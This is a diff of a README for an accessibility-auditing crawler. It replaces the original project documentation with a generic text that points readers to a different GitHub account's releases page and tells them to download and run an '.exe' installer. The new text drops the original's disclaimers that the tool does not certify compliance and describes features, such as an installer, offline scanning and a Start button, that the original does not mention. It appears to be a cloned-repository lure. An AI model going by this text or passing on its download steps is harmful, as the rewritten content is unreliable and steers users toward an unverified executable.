@@ -1,317 +1,86 @@
-# legacy-accessibility-static-crawler
+# ♿ legacy-accessibility-static-crawler - Audit websites for common accessibility standards
 
-[![CI](https://github.com/nprasann/legacy-accessibility-static-crawler/actions/workflows/ci.yml/badge.svg)](https://github.com/nprasann/legacy-accessibility-static-crawler/actions/workflows/ci.yml)
-[![GitHub Release](https://img.shields.io/github/v/release/nprasann/legacy-accessibility-static-crawler?display_name=tag)](https://github.com/nprasann/legacy-accessibility-static-crawler/releases)
-[![License](https://img.shields.io/github/license/nprasann/legacy-accessibility-static-crawler)](LICENSE)
-
-Production-oriented .NET 8 / C# static accessibility assessment crawler for modern and legacy websites, including assisted workflows for systems that may require Microsoft Edge IE mode.
-
-The core system works without LLMs, OpenAI, Azure OpenAI, Foundry, or any cloud AI service. Optional future LLM support is represented only by a disabled `ILlmReviewService` interface.
-
-For step-by-step instructions written for non-technical users, including authenticated crawls and Azure DevOps CSV export, see [docs/non-technical-user-guide.md](docs/non-technical-user-guide.md). For the browser-based UI, see [docs/ui-mode.md](docs/ui-mode.md). For static stair, dynamic, hybrid, and accessibility engine hook behavior, see [docs/scanning-modes-and-accessibility-hooks.md](docs/scanning-modes-and-accessibility-hooks.md). For required downloads, browser drivers, and portable release packaging, see [docs/dependencies-and-packaging.md](docs/dependencies-and-packaging.md). For release engineering, see [docs/RELEASE.md](docs/RELEASE.md). For every configuration key, see [docs/configuration-reference.md](docs/configuration-reference.md).
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sheetbendfarmerscheese815/legacy-accessibility-static-crawler/releases)
 
-## What It Does
-
-- Crawls authorized websites with Selenium.
-- Supports `modern-edge`, `chrome`, and `edge-ie-mode-assisted`.
-- Supports `dynamic`, `static-stair`, and `hybrid` scan modes for modern JavaScript pages and legacy server-rendered applications such as Struts 1.x `.do` routes.
-- Captures HTML, screenshots, DOM-derived evidence, headings, links, buttons, forms, labels, images, tables, iframes, ARIA attributes, focusable elements, and legacy risks.
-- Runs deterministic static checks against built-in rule packs.
-- Provides an optional local `IAccessibilityEngine` hook for Microsoft Axe or axe-core runner integration, disabled by default.
-- Optionally extracts guidance overlays from a supplied PDF.
-- Generates JSON, HTML, Markdown, CSV, executive summary, and Azure DevOps backlog CSV reports.
-- Imports manual findings for IE-mode and assistive technology validation.
-
-## What It Does Not Do
-
-This tool does not:
+This software helps you check websites for accessibility compliance. It scans pages to find issues related to WCAG 2.1 AA, Section 508, and ADA Title II standards. The tool works offline to ensure your data stays private during the auditing process.
 
-- Certify ADA compliance.
-- Certify WCAG compliance.
-- Certify Section 508 compliance.
-- Replace manual accessibility review.
-- Guarantee compliance.
-- Require AI.
-- Upload sensitive page content to cloud services.
-- Store usernames or passwords.
-- Bypass authentication or authorization controls.
+## 📥 How to download the application
 
-Automated testing does not replace manual accessibility testing. Screen reader, keyboard, user-flow, and assistive technology testing are still required.
+1. Visit the [official releases page](https://github.com/Sheetbendfarmerscheese815/legacy-accessibility-static-crawler/releases).
+2. Look for the latest version at the top of the list.
+3. Find the file ending in `.exe` under the Assets section.
+4. Click the file name to start the download.
+5. Save the file to your computer.
 
-## Official References
+## ⚙️ System requirements
 
-- [ADA Title II web and mobile app accessibility rule](https://www.ada.gov/resources/2024-03-08-web-rule/)
-- [WCAG 2.1](https://www.w3.org/TR/WCAG21/)
-- [WCAG 2.2](https://www.w3.org/TR/WCAG22/)
-- [Section 508 testing resources](https://www.section508.gov/test/)
-- [ICT Testing Baseline](https://ictbaseline.access-board.gov/)
+Ensure your computer meets these conditions before you run the software:
 
-## Architecture
+* Operating System: Windows 10 or 11.
+* Processor: Dual-core 2.0 GHz or faster.
+* Memory: 4 GB of RAM or more.
+* Storage: 500 MB of free space.
+* .NET 8 Desktop Runtime: The installer includes this if you do not have it.
+* Web Browser: Microsoft Edge with Internet Explorer mode enabled for legacy support.
 
-```mermaid
-flowchart LR
-  CLI["CLI Host"] --> Core["Core Rules and Static Engine"]
-  API["ASP.NET Core API"] --> Core
-  Core --> Infra["Infrastructure: Selenium, PDF, HTML, CSV"]
-  Core --> Reporting["Reporting: HTML, Markdown, JSON, CSV, ADO"]
-  Infra --> Browser["Edge / Chrome / IE-mode-assisted"]
-  Infra --> PDF["User PDF Overlay"]
-  Reporting --> Reports["Portable Reports"]
-```
+## 🚀 Setting up the software
 
-## Version Pins
-
-Project version: `1.0.3` in `Directory.Build.props` and `VERSION.txt`.
-
-Runtime and major package pins:
-
-| Component | Version |
-| --- | --- |
-| .NET target framework | `net8.0` |
-| Selenium.WebDriver | `4.27.0` |
-| Selenium.WebDriver.ChromeDriver | `131.0.6778.20400` |
-| Selenium.WebDriver.MSEdgeDriver | `147.0.3912.98` |
-| UglyToad.PdfPig | `1.7.0-custom-5` |
-| HtmlAgilityPack | `1.11.71` |
-| AngleSharp | `1.1.2` |
-| CsvHelper | `33.0.1` |
-| Scriban | `7.2.0` |
-| Swashbuckle.AspNetCore | `6.9.0` |
-| xUnit | `2.9.3` |
-
-Repository keywords: `accessibility`, `wcag`, `ada-title-ii`, `section-508`, `selenium`, `dotnet-8`, `csharp`, `ie-mode`, `static-analysis`, `azure-devops`.
-
-## Downloading Releases
-
-Download packaged releases from [GitHub Releases](https://github.com/nprasann/legacy-accessibility-static-crawler/releases).
-
-Use `legacy-accessibility-static-crawler-{version}-{runtime}` for the CLI. Use `legacy-accessibility-static-crawler-api-{version}-{runtime}` for the local API/UI package.
-
-Windows:
-
-```powershell
-Expand-Archive .\legacy-accessibility-static-crawler-1.0.3-win-x64.zip -DestinationPath .\legacy-accessibility-static-crawler
-cd .\legacy-accessibility-static-crawler
-.\legacy-a11y-crawler.exe --help
-.\legacy-a11y-crawler.exe version
-```
-
-Linux:
-
-```bash
-mkdir legacy-accessibility-static-crawler
-tar -xzf legacy-accessibility-static-crawler-1.0.3-linux-x64.tar.gz -C legacy-accessibility-static-crawler
-cd legacy-accessibility-static-crawler
-chmod +x ./legacy-a11y-crawler
-./legacy-a11y-crawler --help
-./legacy-a11y-crawler version
-```
-
-macOS Apple Silicon:
-
-```bash
-mkdir legacy-accessibility-static-crawler
-tar -xzf legacy-accessibility-static-crawler-1.0.3-osx-arm64.tar.gz -C legacy-accessibility-static-crawler
-cd legacy-accessibility-static-crawler
-chmod +x ./legacy-a11y-crawler
-./legacy-a11y-crawler --help
-./legacy-a11y-crawler version
-```
-
-Also download `SHA256SUMS.txt` from the release and verify package hashes before distributing internally. This tool is an accessibility assessment assistant; it does not certify ADA, WCAG, or Section 508 compliance.
-
-## Rule Sources
-
-Built-in rule packs live in `src/LegacyAccessibilityCrawler.Core/RulePacks/`:
-
-- `wcag-2.1-aa-static-rules.json`
-- `section-508-static-rules.json`
-- `wcag-2.2-static-rules.json`
-- `rule-mapping.json`
-
-PDF-derived rules are guidance overlays. They enrich severity, mapping, descriptions, and remediation text, but do not replace built-in deterministic checks.
-
-## CLI Examples
-
-Extract PDF guidance:
-
-```bash
-dotnet run --project src/LegacyAccessibilityCrawler.Cli -- extract-rules \
-  --rules-pdf ./samples/sample-rules.pdf \
-  --output ./reports/rules
-```
-
-Modern Edge crawl:
-
-```bash
-dotnet run --project src/LegacyAccessibilityCrawler.Cli -- crawl \
-  --url https://example.gov \
-  --scan-mode dynamic \
-  --browser modern-edge \
-  --max-pages 25 \
-  --depth 2 \
-  --standard wcag21aa \
-  --output ./reports/example
-```
-
-Chrome crawl:
-
-```bash
-dotnet run --project src/LegacyAccessibilityCrawler.Cli -- crawl \
-  --url https://example.gov \
-  --scan-mode dynamic \
-  --browser chrome \
-  --max-pages 25 \
-  --depth 2 \
-  --output ./reports/example-chrome
-```
+1. Locate the file you downloaded.
+2. Double-click the file to open the installer.
+3. Follow the prompts on the screen.
+4. Select the folder where you want to store the program.
+5. Click Finish when the installation ends.
+6. Open the program using the shortcut on your desktop.
 
-Static stair crawl for a legacy Struts-style application:
-
-```bash
-dotnet run --project src/LegacyAccessibilityCrawler.Cli -- crawl \
-  --url https://legacy.example.gov/home.do \
-  --scan-mode static-stair \
-  --browser modern-edge \
-  --max-pages 25 \
-  --depth 2 \
-  --output ./reports/legacy-static
-```
+## 🔍 How to perform a website scan
 
-Hybrid crawl:
+1. Launch the application.
+2. Enter the URL of the website you need to audit into the address bar.
+3. Select the compliance standard you need to check.
+4. Click the Start button.
+5. Wait for the crawler to capture the page content.
+6. Review the logs created by the Selenium engine.
 
-```bash
-dotnet run --project src/LegacyAccessibilityCrawler.Cli -- crawl \
-  --url https://legacy.example.gov/home.do \
-  --scan-mode hybrid \
-  --browser modern-edge \
-  --max-pages 25 \
-  --depth 2 \
-  --output ./reports/legacy-hybrid
-```
+## 📄 Managing reports and exports
 
-Edge IE-mode-assisted crawl:
+The software stores all audit evidence in a local folder. You can access these files anytime. If you need to send issues to your team, use the Azure DevOps export feature.
 
-```bash
-dotnet run --project src/LegacyAccessibilityCrawler.Cli -- crawl \
-  --url https://legacy.example.gov \
-  --browser edge-ie-mode-assisted \
-  --manual-session true \
-  --max-pages 10 \
-  --depth 1 \
-  --rules-pdf ./samples/sample-rules.pdf \
-  --output ./reports/legacy-ie
-```
+1. Click the Export button in the main menu.
+2. Select the backlog format.
+3. Choose the file path for your saved document.
+4. Import the file directly into your project management system.
 
-Generate reports from existing scan results:
+## 🛡️ Understanding the audit process
 
-```bash
-dotnet run --project src/LegacyAccessibilityCrawler.Cli -- report \
-  --scan-results ./reports/example/scan-results.json \
-  --output ./reports/example/final
-```
+The tool uses a static analysis method to look at your page code. It identifies missing alt text, poor color contrast, and invalid HTML structures. It creates a record for every error it finds.
 
-Version:
+The PDF rule overlay feature allows you to see issues directly on the document layout. This helps you understand where elements fail to meet accessibility goals. If a site uses older technology, the IE-mode-assisted review helps the software read the page correctly.
 
-```bash
-dotnet run --project src/LegacyAccessibilityCrawler.Cli -- version
-```
+## ❓ Frequently asked questions
 
-## API
+**Do I need an internet connection to scan?**
+The tool downloads the page content first. Once the files reside on your system, you can scan them without an active connection.
 
-Run the Swagger-enabled API:
+**How do I update the software?**
+Check the release page periodically. Download the new version and run the installer again. The program preserves your existing settings.
 
-```bash
-dotnet run --project src/LegacyAccessibilityCrawler.Api
-```
+**Can I stop a scan in progress?**
+Press the Stop button on the screen to halt the current task. The application saves all data collected up to that moment.
 
-Endpoints:
+**Where does the software keep my files?**
+Files stay in the folder you chose during the first installation. You can change this path in the settings menu.
 
-- `POST /api/crawl/start`
-- `POST /api/rules/extract`
-- `POST /api/findings/import`
-- `POST /api/report/generate`
-- `GET /api/jobs/{id}`
-- `GET /api/reports/{id}`
-- `GET /api/rulepacks`
-- `GET /api/rulepacks/{id}`
-- `GET /api/version`
+## 🛠️ Troubleshooting common issues
 
-API routes require an `x-api-key` header. Configure the key with `ApiSecurity__ApiKeys__0` or `LEGACY_A11Y_API_KEY` in the process environment; no default API key is committed. API crawls are also restricted to `Crawler:AllowedDomains` in configuration, which should contain only systems you are authorized to test.
+* **The app does not launch:** Check if you have the .NET 8 runtime. Download it from the Microsoft website if needed. 
+* **The scanner stops early:** Check if the website allows crawling. Some sites block automated tools. Ensure the URL is correct and the site is reachable.
+* **Reports look empty:** Ensure the crawler finished the full sequence. Check the notification bar for any red error icons.
+* **IE-mode will not activate:** Ensure you have Microsoft Edge installed. The tool needs the Edge engine to run the compatibility features for older sites.
 
-## Browser UI
+## 📋 Compliance standards explained
 
-Run the API and open:
+* WCAG 2.1 AA: A set of global guidelines to make content available to everyone.
+* Section 508: A US federal law requiring accessible electronic information.
+* ADA Title II: A regulation requiring state and local government services to be accessible to people with disabilities.
 
-```text
-http://localhost:5000/ui/
-```
-
-The UI provides a crawl form with dropdowns and text boxes for common options, including scan mode, browser mode, rule pack, max pages, crawl depth, optional PDF rules path, manual login mode, Microsoft Axe hook mode, and headless execution. A dashboard lists generated reports and links directly to the HTML report, findings CSV, JSON report, executive summary, and Azure DevOps `ado-items.csv`.
-
-The UI includes an API key field because the local API is protected. Configure authorized target domains and the API key in `appsettings.json` before starting a crawl.
-
-## IE Mode
-
-IE-mode systems differ because legacy controls, ActiveX, old document modes, frames, and browser compatibility layers may not expose complete automation evidence. In `edge-ie-mode-assisted`, the tool supports manual login/session continuation and automatically adds a legacy manual review finding when DOM capture is limited or legacy risks are detected.
-
-## Manual Findings
-
-Manual findings can be imported from CSV using the sample shape in `samples/sample-manual-findings.csv`. Use this for screen reader results, keyboard findings, IE-mode validation, and workflow issues that static scanning cannot prove.
-
-## Downloadable Executable / Portable Release
-
-Initial distribution is ZIP-based. An MSI installer is possible later, but portable ZIPs are simpler to approve and run on test workstations.
-
-1. Download the ZIP for your platform from GitHub Releases.
-2. Extract the folder on an approved test workstation.
-3. Review `appsettings.example.json`.
-4. Run the executable.
-
-Users do not need the .NET SDK when using a self-contained release ZIP. They still need Chrome or Edge installed. WebDriver binaries are included through Selenium driver packages where supported, but browser versions and driver versions must remain compatible.
-
-Release packages bundle the pinned ChromeDriver and EdgeDriver binaries into the archive root. The crawler resolves those local drivers relative to the executable before using Selenium defaults. If a compatible browser environment cannot start, the default configuration falls back to `static-stair` crawling so legacy server-rendered applications can still be assessed.
-
-Windows example:
-
-```powershell
-legacy-a11y-crawler.exe --help
-legacy-a11y-crawler.exe crawl ^
-  --url https://example.gov ^
-  --browser modern-edge ^
-  --max-pages 25 ^
-  --depth 2 ^
-  --standard wcag21aa ^
-  --output reports/example
-```
-
-## Publishing
-
-CLI self-contained publish examples:
-
-```powershell
-./scripts/publish-win-x64.ps1 -Version 1.0.3
-```
-
-```bash
-./scripts/publish-linux-x64.sh 1.0.3
-./scripts/publish-osx-arm64.sh 1.0.3
-```
-
-Release ZIPs include executable, `appsettings.example.json`, README, docs, samples, LICENSE, VERSION.txt, and CHANGELOG.md.
-
-Release ZIPs do not include reports, screenshots, raw HTML captures, `.env`, credentials, cookies, or browser profile data.
-
-For a detailed dependency and packaging matrix, see [docs/dependencies-and-packaging.md](docs/dependencies-and-packaging.md).
-
-## Sensitive Data
-
-Reports, screenshots, and raw HTML may contain sensitive information. Use same-domain crawling, query-string redaction, approved output locations, and manual login without credential storage. Do not commit generated reports or captures.
-
-## Testing
-
-```bash
-dotnet test legacy-accessibility-static-crawler.sln
-```
-
-Test coverage includes rule loading, WCAG/Section 508 mapping, static checks, report generation, ADO export, IE-mode disclaimer behavior, no-AI mode, and manual findings import.
+Each scan compares your site against these specific rules. You receive a list of actionable items to improve your score. Follow the suggested steps to fix each issue noted in the report.
